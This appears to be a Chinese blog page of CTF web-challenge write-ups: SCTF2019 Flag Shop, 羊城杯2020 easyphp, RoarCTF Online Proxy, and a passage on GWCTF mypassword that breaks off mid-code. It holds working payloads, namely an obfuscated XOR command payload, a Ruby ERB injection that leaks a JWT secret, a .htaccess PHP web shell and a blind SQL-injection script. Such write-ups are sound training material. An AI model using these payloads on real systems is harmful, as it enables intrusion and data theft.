<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span>b<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%96</span><span class="hljs-variable">%93</span><span class="hljs-variable">%9</span>a)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%9</span>b<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%93</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%9</span>a<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%96</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%9</span>a<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>b)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%93</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span>))(((<span class="hljs-variable">%8</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%9</span><span class="hljs-keyword">c</span><span class="hljs-variable">%9</span>b<span class="hljs-variable">%96</span><span class="hljs-variable">%8</span><span class="hljs-keyword">c</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span>)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%93</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>b)^(<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>e<span class="hljs-variable">%ff</span><span class="hljs-variable">%ff</span><span class="hljs-variable">%9</span>a))(<span class="hljs-variable">%d1</span>^<span class="hljs-variable">%ff</span>)))<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<h2 id="SCTF2019-Flag-Shop"><a href="#SCTF2019-Flag-Shop" class="headerlink" title="[SCTF2019]Flag Shop"></a>[SCTF2019]Flag Shop</h2><p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062157982.png" srcset="/img/loading.gif" lazyload alt="image-20240606215708900"></p>
<p>buy flag</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062157903.png" srcset="/img/loading.gif" lazyload alt="image-20240606215740837"></p>
<p>抓包看看</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062159494.png" srcset="/img/loading.gif" lazyload alt="image-20240606215927433"></p>
<p>jwt加密，需要找到key</p>
<p>robots.txt存在</p>
<p>源码</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/cookies&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;sinatra/json&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;jwt&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;securerandom&#x27;</span><br><span class="hljs-keyword">require</span> <span class="hljs-string">&#x27;erb&#x27;</span><br><br>set <span class="hljs-symbol">:public_folder</span>, <span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/static&#x27;</span><br><br><span class="hljs-variable constant_">FLAGPRICE</span> = <span class="hljs-number">1000000000000000000000000000</span><br><span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] = <span class="hljs-title class_">SecureRandom</span>.hex(<span class="hljs-number">64</span>)<br><br>configure <span class="hljs-keyword">do</span><br>  enable <span class="hljs-symbol">:logging</span><br>  file = <span class="hljs-title class_">File</span>.new(<span class="hljs-title class_">File</span>.dirname(<span class="hljs-variable constant_">__FILE__</span>) + <span class="hljs-string">&#x27;/../log/http.log&#x27;</span>,<span class="hljs-string">&quot;a+&quot;</span>)<br>  file.sync = <span class="hljs-literal">true</span><br>  use <span class="hljs-title class_">Rack</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:CommonLogger</span>, file<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/&quot;</span> <span class="hljs-keyword">do</span><br>  redirect <span class="hljs-string">&#x27;/shop&#x27;</span>, <span class="hljs-number">302</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/filebak&quot;</span> <span class="hljs-keyword">do</span><br>  content_type <span class="hljs-symbol">:text</span><br>  erb <span class="hljs-variable constant_">IO</span>.binread <span class="hljs-variable constant_">__FILE__</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/auth&quot;</span> <span class="hljs-keyword">do</span><br>  payload = &#123; <span class="hljs-symbol">uid:</span> <span class="hljs-title class_">SecureRandom</span>.uuid , <span class="hljs-symbol">jkl:</span> <span class="hljs-number">20</span>&#125;<br>  auth = <span class="hljs-variable constant_">JWT</span>.encode payload,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>  cookies[<span class="hljs-symbol">:auth</span>] = auth<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/api/info&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  json(&#123;<span class="hljs-symbol">uid:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;uid&quot;</span>],<span class="hljs-symbol">jkl:</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>]&#125;)<br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  erb <span class="hljs-symbol">:shop</span><br><span class="hljs-keyword">end</span><br><br>get <span class="hljs-string">&quot;/work&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br>  auth = auth[<span class="hljs-number">0</span>]<br>  <span class="hljs-keyword">unless</span> params[<span class="hljs-symbol">:SECRET</span>].<span class="hljs-literal">nil</span>?<br>    <span class="hljs-keyword">if</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>].match(<span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:SECRET</span>].match(<span class="hljs-regexp">/[0-9a-z]+/</span>)&#125;</span>&quot;</span>)<br>      puts <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]<br>    <span class="hljs-keyword">end</span><br>  <span class="hljs-keyword">end</span><br><br>  <span class="hljs-keyword">if</span> params[<span class="hljs-symbol">:do</span>] == <span class="hljs-string">&quot;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> is working&quot;</span> <span class="hljs-keyword">then</span><br><br>    auth[<span class="hljs-string">&quot;jkl&quot;</span>] = auth[<span class="hljs-string">&quot;jkl&quot;</span>].to_i + <span class="hljs-title class_">SecureRandom</span>.random_number(<span class="hljs-number">10</span>)<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    <span class="hljs-variable constant_">ERB</span><span class="hljs-symbol">:</span><span class="hljs-symbol">:new</span>(<span class="hljs-string">&quot;&lt;script&gt;alert(&#x27;<span class="hljs-subst">#&#123;params[<span class="hljs-symbol">:name</span>][<span class="hljs-number">0</span>,<span class="hljs-number">7</span>]&#125;</span> working successfully!&#x27;)&lt;/script&gt;&quot;</span>).result<br><br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br>post <span class="hljs-string">&quot;/shop&quot;</span> <span class="hljs-keyword">do</span><br>  islogin<br>  auth = <span class="hljs-variable constant_">JWT</span>.decode cookies[<span class="hljs-symbol">:auth</span>],<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-literal">true</span>, &#123; <span class="hljs-symbol">algorithm:</span> <span class="hljs-string">&#x27;HS256&#x27;</span> &#125;<br><br>  <span class="hljs-keyword">if</span> auth[<span class="hljs-number">0</span>][<span class="hljs-string">&quot;jkl&quot;</span>] &lt; <span class="hljs-variable constant_">FLAGPRICE</span> <span class="hljs-keyword">then</span><br><br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;error&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;no enough jkl&quot;</span>&#125;)<br>  <span class="hljs-keyword">else</span><br><br>    auth &lt;&lt; &#123;<span class="hljs-symbol">flag:</span> <span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;FLAG&quot;</span>]&#125;<br>    auth = <span class="hljs-variable constant_">JWT</span>.encode auth,<span class="hljs-variable constant_">ENV</span>[<span class="hljs-string">&quot;SECRET&quot;</span>] , <span class="hljs-string">&#x27;HS256&#x27;</span><br>    cookies[<span class="hljs-symbol">:auth</span>] = auth<br>    json(&#123;<span class="hljs-symbol">title:</span> <span class="hljs-string">&quot;success&quot;</span>,<span class="hljs-symbol">message:</span> <span class="hljs-string">&quot;jkl is good thing&quot;</span>&#125;)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">islogin</span><br>  <span class="hljs-keyword">if</span> cookies[<span class="hljs-symbol">:auth</span>].<span class="hljs-literal">nil</span>? <span class="hljs-keyword">then</span><br>    redirect to(<span class="hljs-string">&#x27;/shop&#x27;</span>)<br>  <span class="hljs-keyword">end</span><br><span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure>

<p>Ruby ERB模板注入</p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86867">【技术分享】手把手教你如何完成Ruby ERB模板注入</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs none">work?SECRET=&amp;name=&lt;%=$&#x27;%&gt;&amp;do=&lt;%=$&#x27;%&gt; is working<br>//urlencode<br>work?SECRET=&amp;name=%3C%25%3D%24&#x27;%25%3E&amp;do=%3C%25%3D%24&#x27;%25%3E%20is%20working<br></code></pre></td></tr></table></figure>

<p>返回如下，这样就拿到了当下的jwt token和key</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs none">HTTP/1.1 200 OK<br>Server: openresty<br>Date: Tue, 10 Aug 2021 08:55:15 GMT<br>Content-Type: text/html;charset=utf-8<br>Content-Length: 176<br>Connection: close<br>Set-Cookie: auth=eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOiJmMDBmZjcwNi02ZDFhLTQzOGQtOGM0OC02ZWMyYTNkN2Y1MzIiLCJqa2wiOjc1fQ.KH-pPeCd_V98pV9VdNCGEATa3XofmPKd934pW7mDqvw; domain=0e50b8a0-5392-476e-a5ce-cd30228e8582.node4.buuoj.cn; path=/; HttpOnly<br>X-Content-Type-Options: nosniff<br>X-Frame-Options: SAMEORIGIN<br>X-Xss-Protection: 1; mode=block<br><br>&lt;script&gt;alert(&#x27;ebe18e25bc2e1a0d8d48db9b6df08d7101eed13861254583d435edf271c197e636d5e57a74a650fc39cbeaf4a78226d8290f2407cc0471d1314a5f4ea44d1877 working successfully!&#x27;)&lt;/script&gt;<br></code></pre></td></tr></table></figure>

<p>有了key后直接修改金额</p>
<p>返回成功</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062229704.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<p>flag藏在jwt里</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202406062230898.png" srcset="/img/loading.gif" lazyload alt="img"></p>
<h2 id="羊城杯2020-easyphp"><a href="#羊城杯2020-easyphp" class="headerlink" title="[羊城杯2020]easyphp"></a>[羊城杯2020]easyphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>]) || !<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>])) &#123;<br>        <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;on&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;html&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;type&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;flag&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;upload&#x27;</span>) || <span class="hljs-title function_ invoke__">stristr</span>(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;file&#x27;</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;filename&#x27;</span>];<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[^a-z\.]/&quot;</span>, <span class="hljs-variable">$filename</span>) == <span class="hljs-number">1</span>) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Hacker&quot;</span>;<br>        <span class="hljs-keyword">die</span>();<br>    &#125;<br>    <span class="hljs-variable">$files</span> = <span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">&#x27;./&#x27;</span>); <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$files</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$file</span>) &#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_file</span>(<span class="hljs-variable">$file</span>))&#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file</span> !== <span class="hljs-string">&quot;index.php&quot;</span>) &#123;<br>                <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$file</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$content</span> . <span class="hljs-string">&quot;\nHello, world&quot;</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>写入文件，限定当前目录下非”index.php”的文件都会被删除。</p>
<p>考虑写入.htaccess文件，它比较灵活，不需要重启服务器，也不需要管理员权限。其格式为<code>php_value 名称 值</code>，在这里写入🐎（以注释的方式），然后在页面顶部加载它</p>
<p>存在对file的过滤 ,在.htaccess中\的作用是拼接上下文</p>
<p>#在htaccess文件中是注释符的意思，但是在执行php文件中会直接执行后面的一句话，\的作用是注释后面的拼接，以执行命令</p>
<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">php_value auto_prepend_fi\</span><br><span class="language-xml">le &quot;.htaccess&quot;</span><br><span class="language-xml"># </span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span></span><span class="language-xml">\</span><br></code></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">?filename=.htaccess&amp;content=php_value%<span class="hljs-number">20</span>auto_prepend_fi\%<span class="hljs-number">0</span>ale%<span class="hljs-number">20</span><span class="hljs-string">&quot;.htaccess&quot;</span>%<span class="hljs-number">0</span>a%<span class="hljs-number">23</span>%<span class="hljs-number">20</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span>\<br></code></pre></td></tr></table></figure>

<h2 id="RoarCTF-2019-Online-Proxy"><a href="#RoarCTF-2019-Online-Proxy" class="headerlink" title="[RoarCTF 2019]Online Proxy"></a>[RoarCTF 2019]Online Proxy</h2><p>看源代码发现</p>
<p><img src="https://raw.githubusercontent.com/Englobe/picture/main/202410232234635.png" srcset="/img/loading.gif" lazyload alt="image-20241023223417501"></p>
<p>通过X-Forwarded-For，可以伪造我们的IP，而且还会显示last和current，ip</p>
<p>先输入 1’ or ‘1 此时我们的current IP就等于它，让后我们再随便换一个其他的东西，只要和刚才那个不一样就可以，比如111，那么我们的current IP就成了：111，而last IP就是1’ or ‘1，此时1’ or ‘1已经写入了数据库 .因为第一次和第二次传输的IP不一样，所以服务器并不会从数据库找last IP，它会把上次的IP（1’or ‘1）直接显示为last IP，让后存入数据库。那么我们再传一次111，因为和currnet IP相同，那么last IP就会从数据库里寻找，也就是会执行1’or‘1，结果为1。</p>
<p>就是需要尝试三次，我们第一次输入的ip才会进入数据库的查询</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br><br>url = <span class="hljs-string">&quot;http://node5.buuoj.cn:26696/&quot;</span><br><br><span class="hljs-comment">#这个head头好像必须加cookie</span><br>head =&#123;<br>    <span class="hljs-string">&quot;X-Forwarded-For&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<br>    <span class="hljs-string">&quot;Cookie&quot;</span> : <span class="hljs-string">&quot;track_uuid=9c34a137-919c-4ae0-b8ed-c71fd0d775bc&quot;</span><br>&#125;<br><br><span class="hljs-comment"># #查库名</span><br><span class="hljs-comment">#payload = &quot;0&#x27; or ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span><br><br><span class="hljs-comment"># #查表名</span><br><span class="hljs-comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=&#x27;F4l9_D4t4B45e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span><br><br><span class="hljs-comment"># #查列名</span><br><span class="hljs-comment"># payload = &quot;0&#x27; or ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;F4l9_t4b1e&#x27;)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span><br><br><span class="hljs-comment">#查flag</span><br>payload = <span class="hljs-string">&quot;0&#x27; or ascii(substr((select(group_concat(F4l9_C01uMn))from(F4l9_D4t4B45e.F4l9_t4b1e)),&#123;&#125;,1))&gt;&#123;&#125; or &#x27;0&quot;</span><br><br>flag =<span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">1000</span>):<br>    low = <span class="hljs-number">32</span><br>    high =<span class="hljs-number">137</span><br>    mid = (low+high)//<span class="hljs-number">2</span><br><br>    <span class="hljs-keyword">while</span>(low &lt; high):<br>        <span class="hljs-built_in">print</span>(i,mid)<br>        <span class="hljs-string">&#x27;&#x27;&#x27;插入sql语句&#x27;&#x27;&#x27;</span><br>        payload1 = payload.<span class="hljs-built_in">format</span>(i,mid)<br>        head[<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>] = payload1<br>        <span class="hljs-built_in">print</span>(head[<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>])<br>        r = requests.get(url,headers=head)<br><br>        <span class="hljs-string">&#x27;&#x27;&#x27;重新发送两次请求&#x27;&#x27;&#x27;</span><br>        head[<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>]= <span class="hljs-string">&quot;penson&quot;</span><br>        r = requests.get(url,headers=head)<br>        r = requests.get(url,headers=head)<br><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;Last Ip: 1 &quot;</span> <span class="hljs-keyword">in</span> r.text:<br>            low = mid+<span class="hljs-number">1</span><br>        <span class="hljs-keyword">else</span>:<br>            high = mid<br><br>        mid =(low+high)//<span class="hljs-number">2</span><br><br><br>    <span class="hljs-keyword">if</span>(mid ==<span class="hljs-number">32</span> <span class="hljs-keyword">or</span> mid ==<span class="hljs-number">127</span>):<br>        <span class="hljs-keyword">break</span><br>    flag +=<span class="hljs-built_in">chr</span>(mid)<br>    <span class="hljs-built_in">print</span>(flag)<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h2 id="GWCTF-2019-mypassword"><a href="#GWCTF-2019-mypassword" class="headerlink" title="[GWCTF 2019]mypassword"></a>[GWCTF 2019]mypassword</h2><p>注册登录</p>
<p>加载了一个<code>js</code>文件</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (<span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> &amp;&amp; <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span> != <span class="hljs-string">&#x27;&#x27;</span>) &#123;<br>	<span class="hljs-keyword">var</span> cookies = <span class="hljs-variable language_">document</span>.<span class="hljs-property">cookie</span>.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;; &#x27;</span>);<br>	<span class="hljs-keyword">var</span> cookie = &#123;&#125;;<br>	<span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> i = <span class="hljs-number">0</span>; i &lt; cookies.<span class="hljs-property">length</span>; i++) &#123;<br>		<span class="hljs-keyword">var</span> arr = cookies[i].<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;=&#x27;</span>);<br>		<span class="hljs-keyword">var</span> key = arr[<span class="hljs-number">0</span>];<br>		cookie[key] = arr[<span class="hljs-number">1</span>];<br>	&#125;<br>	<span class="hljs-keyword">if</span>(<span class="hljs-title function_">typeof</span>(cookie[<span 